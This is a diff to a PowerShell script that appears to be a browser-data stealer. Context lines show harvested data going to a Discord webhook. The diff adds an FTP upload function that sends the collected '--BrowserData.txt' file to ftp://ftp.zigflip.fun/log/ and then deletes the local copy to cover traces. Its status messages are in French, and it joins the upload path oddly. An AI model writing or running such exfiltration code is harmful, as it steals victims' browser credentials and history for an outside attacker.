@@ -99,4 +99,35 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--Browser
 
 
 ############################################################################################################################################################
+
+function ftp-upload {
+    param (
+        [string]$ftpServer,
+        [string]$remotePath,
+        [string]$ftpUsername,
+        [string]$ftpPassword,
+        [string]$fileupload
+    )
+
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+        
+        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/BrowserData" + $fileupload, "c:\" + $fileupload)
+
+        Write-Host "Le fichier a été uploadé avec succès."
+    }
+    catch {
+        Write-Host "Chemin de fileupload : $fileupload"
+        Write-Host "Erreur lors de l'upload du fichier : $_.Exception.Message"
+    }
+    finally {
+        $webClient.Dispose()
+    }
+}
+
+ftp-upload -ftpServer $ftpServer -remotePath $remotePath -ftpUsername $ftpUsername -ftpPassword $ftpPassword -fileupload $env:TMP\--BrowserData.txt
+
+#################################################################################################
+
 RI $env:TEMP/--BrowserData.txt
